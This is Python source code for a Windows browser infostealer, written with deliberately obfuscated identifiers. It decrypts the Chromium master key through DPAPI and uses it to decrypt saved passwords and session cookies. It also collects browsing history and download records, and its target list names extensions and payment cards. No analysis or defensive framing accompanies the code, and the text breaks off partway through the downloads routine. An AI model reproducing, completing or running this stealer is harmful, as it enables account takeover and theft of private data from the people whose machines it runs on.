def DHXAZPQGQPVVJJKBZJDJANFZJPUCVIVPURQRHVPZEFEPJNYERCDDNKUHZGEBVPXLQFARZWTJBDTIRWMDRGDEEGUWYI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK, BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN, XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE, WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR, INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY, LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY

    BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    RCHQORWAAKTFWBDKUHIUABHTVBNPIKFTNDOXLOBOBITBQORZXRXESEJSCEV = []

    if "extentions" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK = 0
    else:
        AGTZIMNEBIIUMATLJGDEKDVBTAGANSFXMUQRIKWNWMKBASCCBXMIKQGFPBTQFNHVEFLCUWFOIQBWGMUIEIYVK = None

    if "passwords" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG = []
        BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN = 0
    else:
        XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG = ""
        BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN = None
    if "cookies" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK = []
        XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE = 0
    else:
        EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK = ""
        XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE = None
    if "history" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK = []
        WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR = 0
    else:
        WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK = ""
        WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR = None
    if "downloads" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU = []
        INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY = 0
    else:
        MOMXCZLZPTQVKZTCTPCAIRMJUVYOQOOQASFOXDWTNDXPUDKEZTOEAQIFQTLATNLGMBTQYOWRMVMETPIU = ""
        INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY = None
    if "cards" in BZEZQMTWTCNBWVOWWPLSZEHZFQPXYKSRYOPFGNYRLWANIMVULAIJNMKXFVQIYAFGGMPN:
        GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK = []
        LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY = 0
    else:
        GPGHXOWATMAYHVYISHFGQTXGMKVWDPBNGBRJVWQRJTXGBKYSFHGGKDBJNNCK = ""
        LISEGTYKRSPENLCUCKWPKXUAASUEMTLSWLQWOBPZUXRGMHLGYQWCZKYEFHY = None
    
    def BNMUPVSSCLRTESZZQAIPQMKCYJFBGPUNRBJVCRGLXGLIVXWGUATXNLTYTDXSFDNGHOTVATXBSHXP(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
        if not os.path.exists(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
            return None

        try:
            with open(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, 'r', encoding='utf-8') as v4r_f:
                GBHDKWFSITJCTQCFEUEORWGOZDAPVGZURRWIZRZRPYHNIXVDNEACGVYYXKATSGBHPQCFVPALCTCFRB = json.load(v4r_f)

            TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_key = base64.b64decode(GBHDKWFSITJCTQCFEUEORWGOZDAPVGZURRWIZRZRPYHNIXVDNEACGVYYXKATSGBHPQCFVPALCTCFRB["os_crypt"]["encrypted_key"])[5:]
            JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD = win32crypt.CryptUnprotectData(TUIMBPUBLRYSQJOZDDICOTOGUSLJQSRBDGIOBZYAMZPNKJDYICAEGPHFOAMM_key, None, None, None, 0)[1]
            return JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD
        except:
            return None

    def TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD):
        try:
            YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG = CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK[3:15]
            XDUQLWQGPXNDQHRXGCIXVLTONZSRNIJXZZIANXVAYNCXKQZEPNYUH = CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK[15:-16]
            LAVSQMCNVFKHCQKDGUBKMXSBEBSKLWSCCWLXHKZYOQHYBVRNQQKSDRSVYRCXPDNPFXMNRSIJDSSOGCWIJEBNENCVIS = CAEQMRZGZYYMRKCITYAIDJLTOMELJCRBPIAKMMSGSHZTDJXZCHSRLIRTRPTHVPZUGDJYPWGLXCTINMOBFDGRAQGCAJVUK[-16:]
            KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ = Cipher(algorithms.AES(JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD), modes.GCM(YSYDXQKHADAHSXSHPVZPTEKHSBLEGJQUDEXETZJTQDFQPTECWCVAKIXTCMOWDTMGMNATPTPNOJMNIMEPUKXMWG, LAVSQMCNVFKHCQKDGUBKMXSBEBSKLWSCCWLXHKZYOQHYBVRNQQKSDRSVYRCXPDNPFXMNRSIJDSSOGCWIJEBNENCVIS))
            AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC = KGLZLOJQMSTCQSJREUUTETFORMXOXRZOTMQSGELEVQRGQEOOUZ.decryptor()
            JQQGZBJVVJDWXKHSVSFVLFDGMOHWWCAONLGZUTYOCMQMWHTBPLMINLKIKDPSLJVSYOZPNFFFVMUMULVWRQWPGGLDWPCIURUUFTUE = AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC.update(XDUQLWQGPXNDQHRXGCIXVLTONZSRNIJXZZIANXVAYNCXKQZEPNYUH) + AUQPHJAJHSTTMDVMEKRGRJIBEMJVFBCDNITJHTPDZDHUQUTKAELNC.finalize()
            return JQQGZBJVVJDWXKHSVSFVLFDGMOHWWCAONLGZUTYOCMQMWHTBPLMINLKIKDPSLJVSYOZPNFFFVMUMULVWRQWPGGLDWPCIURUUFTUE.decode()
        except:
            return None
        
    def ICQWSULCFMLFSNGOCDXFBKXXGXEDWCTRMXAPERZAWHDYPGBFHZQLHARXHDKLEB(VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD):
        global BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN
        FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC_db = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'Login Data')
        if not os.path.exists(FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC_db):
            return

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON = sqlite3.connect(":memory:")
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH = sqlite3.connect(FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC_db)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.backup(AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.close()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL = AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.cursor()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR =          f"- Url      : {v4r_row[0]}"
            ATXZQGYXEJEZWVLLUDNNPCAXTQFYNNXHDBBQNCXQGUWVYBKHJZHQIPOYLPCQ =     f"  Username : {v4r_row[1]}"
            FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC =     f"  Password : {TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(v4r_row[2], JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)}"
            VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name = f"  Browser  : {VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD}"
            XXQVIGXXXGEEIPIDPMOJAXRFYOPWFPIONLBFMFYDCJSCADPYZVYYPFENFOIDTPCGRZEMXSARBCPLG.append(f"{IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR}\n{ATXZQGYXEJEZWVLLUDNNPCAXTQFYNNXHDBBQNCXQGUWVYBKHJZHQIPOYLPCQ}\n{FHYHNTPXJNNHFJZFPZPIUCUGQERHGIFJTOAZLDBFQIILKUKVOQELSYVC}\n{VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name}\n")
            BQRNKPDARZYAAWUUBYLQQGHMKPKUKGYVANVTJQIRPUZLDIUSCZEGHWTZYBLZQVDINXQJOQMABHCYEWHBTKN += 1

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.close()

    def CZZRJSCSEASVFSLUQPIJLCNYBVACVLHOKGYBHUITCZYGDBFDRGCEHWDQ(VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD):
        global XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE
        WCWWGBZWWSBQRVNUSTIGCOVWVBBTOUCBTLLUUSJKBMODNXWKTXCMZZLFTPXIPLKKKPLVKWXASRKXCACMTVQPPMVJSGRLEFDSSEV = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'Network', 'Cookies')
        if not os.path.exists(WCWWGBZWWSBQRVNUSTIGCOVWVBBTOUCBTLLUUSJKBMODNXWKTXCMZZLFTPXIPLKKKPLVKWXASRKXCACMTVQPPMVJSGRLEFDSSEV):
            return

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON = sqlite3.connect(":memory:")
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH = sqlite3.connect(WCWWGBZWWSBQRVNUSTIGCOVWVBBTOUCBTLLUUSJKBMODNXWKTXCMZZLFTPXIPLKKKPLVKWXASRKXCACMTVQPPMVJSGRLEFDSSEV)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.backup(AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.close()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL = AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.cursor()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR =          f"- Url     : {v4r_row[0]}"
            WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ =         f"  Name    : {v4r_row[1]}"
            ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX =         f"  Path    : {v4r_row[2]}"
            ZNEWPCDWDWLFGXOUEYVJIWRFSYMNEQXFXRKXEALQHOKZNUTVZJLJASFMIUEZN =       f"  Cookie  : {TVUVQKUHGITWECGYXHUAGRVGAZQCYWWJRFKJMCFHAQKKUDUWSAYQKZGHBMZGQQJYAMNJHUMP(v4r_row[3], JOLEIIKMPBNXCKPEVCBMEBLCWFIERKYNKTXSXUBNAZLZFPWHFWXEDIVYNSMKWBNCGWIXWUNCDBZORTEWYMYNNOVD)}"
            WCHXESWYOQKVLHARGQNCOQVLGOFNPVNBUFCIPDCVXNHLZYQIHXLOIETXWMOEYVHIDUTFBOWTWYTRBGMVUNFARVLLPVOSHVPHEIBC =       f"  Expire  : {v4r_row[4]}"
            VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name = f"  Browser : {VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD}"
            EMHRWLXBHCYNTEAWXWDCSVZAFGPWXJJTALMOYSKJLXAZWIRMEHALVOGTK.append(f"{IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR}\n{WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ}\n{ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX}\n{ZNEWPCDWDWLFGXOUEYVJIWRFSYMNEQXFXRKXEALQHOKZNUTVZJLJASFMIUEZN}\n{WCHXESWYOQKVLHARGQNCOQVLGOFNPVNBUFCIPDCVXNHLZYQIHXLOIETXWMOEYVHIDUTFBOWTWYTRBGMVUNFARVLLPVOSHVPHEIBC}\n{VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name}\n")
            XUCZFHOWEVJXQTCJISCRQSXUTXSHZWOJZIFOXKUAIFNHHLYSBFLZRTMXZUSVQXAQE += 1

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.close()

    def VSMKXVOKFVVPWGIJHFWTYGAVBYGUGWPUNSQUQMOPMYPPDLGBQJLSSSRBUWGBTXKNHEXOVBOMTALRAHRTPTLWM(VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU):
        global WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR
        OLWEUWIMJBMULBXIXIBEQFOABHLPPGHOCTWADHWIRPWIMCEGEUUGBCATIZVJ = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'History')
        if not os.path.exists(OLWEUWIMJBMULBXIXIBEQFOABHLPPGHOCTWADHWIRPWIMCEGEUUGBCATIZVJ):
            return
        
        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON = sqlite3.connect(":memory:")
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH = sqlite3.connect(OLWEUWIMJBMULBXIXIBEQFOABHLPPGHOCTWADHWIRPWIMCEGEUUGBCATIZVJ)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.backup(AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.close()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL = AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.cursor()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR =          f"- Url     : {v4r_row[0]}"
            ZGVQCEFJKQPORNTPVCTTQKFBSGUBEGOFWQWUHSCMLQETRFGYBGMYDQE =        f"  Title   : {v4r_row[1]}"
            SHZTEJLPBFHZJZPJGTKMLIUGAPNOSAISSXRGPRDGRKORRNKPKBTOTDJAKCIKZIVRKNSHBXZIWPAICFSPA =         f"  Time    : {v4r_row[2]}"
            VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name = f"  Browser : {VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD}"
            WABXLGQGDRUWYRHERXDFPXZHZONTQFBJCABCRBMEZEFCZRRIPPDWSLFURREAUCLRJNQNZVOMYEEBNAK.append(f"{IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR}\n{ZGVQCEFJKQPORNTPVCTTQKFBSGUBEGOFWQWUHSCMLQETRFGYBGMYDQE}\n{SHZTEJLPBFHZJZPJGTKMLIUGAPNOSAISSXRGPRDGRKORRNKPKBTOTDJAKCIKZIVRKNSHBXZIWPAICFSPA}\n{VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name}\n")
            WGSDPFHRUJHFSFTDFNZHGZXKYDRRNEFFHPYFIKCYJCLKLFJUUXVYDQBFAFTR += 1

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.close()
    
    def UGYEXMXBPPSHMFEADWCHMAJBUVMGJSBHWGPNKTNVKRHFHMCOJZQLTJXVWLNLOPGDZDRNIVJJNZTMBQ(VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD, QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU):
        global INCLDQWUGPUUYYADCVTOXEXORLVDJPEOZNQBYBAJINNVRCWNZEHGQIMZBMLSXXOHETZDY
        KOWCGHJIYRKXZFMDOZYGNPDGVVYKKEXRMGRHXMEYGEATZIROJYOSZCSO = os.path.join(QVOLXNFKQFEIZHHDEXUMCDCKVKXSXTEETHITXAPRYVPBAXOGCBXEVWPLYPJFRLU, 'History')
        if not os.path.exists(KOWCGHJIYRKXZFMDOZYGNPDGVVYKKEXRMGRHXMEYGEATZIROJYOSZCSO):
            return

        AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON = sqlite3.connect(":memory:")
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH = sqlite3.connect(KOWCGHJIYRKXZFMDOZYGNPDGVVYKKEXRMGRHXMEYGEATZIROJYOSZCSO)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.backup(AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON)
        YNKHJGKUNXGDJOYIPJMEQMKKCZXGXRHBNVPMWHQFGTACHKJOGRIWVDVOUTDJHFFXVZZKGLXDLOYQHLKPRBDBIZWYBH.close()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL = AITQZWYLWBLQLOMETUISQOSQLAVRYNRWBEFHUTVOSGUPXNSXWPMUNRKKPUCHZHMQZPEGIYQACCFZVDHDLZRON.cursor()
        ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.execute('SELECT tab_url, target_path FROM downloads')
        for row in ZWXFSHILGPHDPAPQNPOCOQTWLLVLVYSKOZPJPJMMLAVUJOEYHRDDDJVUHRKGWWLDL.fetchall():
            if not row[0] or not row[1]:
                continue
            ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX =         f"- Path    : {row[1]}"
            IQOOUSNRTOPSFLINNBZPOWNUCMEQTXUGWDVBZLKARFKCXGLOYUBGDIJGXPACZKGHXR =          f"  Url     : {row[0]}"
            VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD_name = f"  Browser : {VVXUZCACHURTSBQEWOFQTYPMFRBXTXGPNMVHUEUOQPSCFJTBDTZZDAPHOKVHIWFIGUD}"
